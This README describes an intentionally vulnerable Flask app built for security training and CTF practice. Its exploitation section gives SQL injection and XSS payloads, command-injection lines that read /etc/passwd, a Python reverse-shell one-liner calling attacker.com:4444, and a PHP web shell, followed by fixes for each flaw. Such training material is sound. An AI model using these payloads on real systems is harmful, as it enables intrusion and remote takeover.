# Vulnerable Web Application Demo

This Flask web application was intentionally designed with security vulnerabilities for educational purposes. It demonstrates common web security issues according to the OWASP Top 10.

## ⚠️ Warning

**This application is intentionally vulnerable and should only be used in a controlled environment for educational purposes.**

**DO NOT deploy this application in a production environment or use it with real user data.**

## Included Vulnerabilities

1. **SQL Injection**: The login form is vulnerable to SQL injection attacks.
2. **Cross-Site Scripting (XSS)**: The comments section allows execution of arbitrary JavaScript.
3. **Insecure Direct Object References (IDOR)**: User profiles can be accessed by manipulating URL parameters.
4. **Path Traversal**: File upload functionality allows saving files to unauthorized locations.
5. **Command Injection**: Admin tools allow executing arbitrary system commands.
6. **Hidden Flag**: A flag file is placed in a restricted directory for CTF-style challenges.
7. **Security Misconfiguration**: The application runs in debug mode and has other security misconfigurations.
8. **Password Storage**: Passwords are stored as plaintext in the database.

## Setup Instructions

1. Create a virtual environment:
   ```
   python -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

2. Install dependencies:
   ```
   pip install -r requirements.txt
   ```

3. Run the application:
   ```
   python app.py
   ```

4. Access the application at http://127.0.0.1:5000

## Exploitation Examples

### SQL Injection
- Username: `' OR '1'='1` with any password
- Username: `admin' --` with any password

### XSS (Cross-Site Scripting)
Post a comment with:
- `<script>alert('XSS');</script>`
- `<img src="x" onerror="alert('XSS')">`

### IDOR (Insecure Direct Object References)
- Navigate to `/profile/1`, `/profile/2`, etc., without proper authorization

### Path Traversal
- Upload a file with subdirectory path: `../restricted`
- This bypasses access controls and allows writing to arbitrary directories

### Command Injection
Use commands like:
- `ping 127.0.0.1 && whoami`
- `ping 127.0.0.1; cat /etc/passwd`
- `ping 127.0.0.1; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`

### Reverse Shell Examples
1. Create a reverse shell file (e.g., shell.php):
   ```php
   <?php system($_GET['cmd']); ?>
   ```

2. Upload to an accessible location using path traversal

3. Access the shell: `/uploads/shell.php?cmd=whoami`

## Capture The Flag

Find and access the hidden flag file in the restricted directory. Hint: It's at `/restricted/flag.txt` but requires either:
- Admin access
- Path traversal through the file upload vulnerability

## Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

## How to Fix These Vulnerabilities

Each vulnerability has a secure alternative:

1. **SQL Injection**: Use parameterized queries or an ORM
2. **XSS**: Sanitize user input and use proper escaping
3. **IDOR**: Implement proper access controls
4. **Path Traversal**: Validate and sanitize file paths, use secure file storage
5. **Command Injection**: Never use user input directly in system commands
6. **Security Misconfiguration**: Turn off debug mode in production, implement proper error handling
7. **Password Storage**: Use password hashing with a strong algorithm (bcrypt, Argon2) 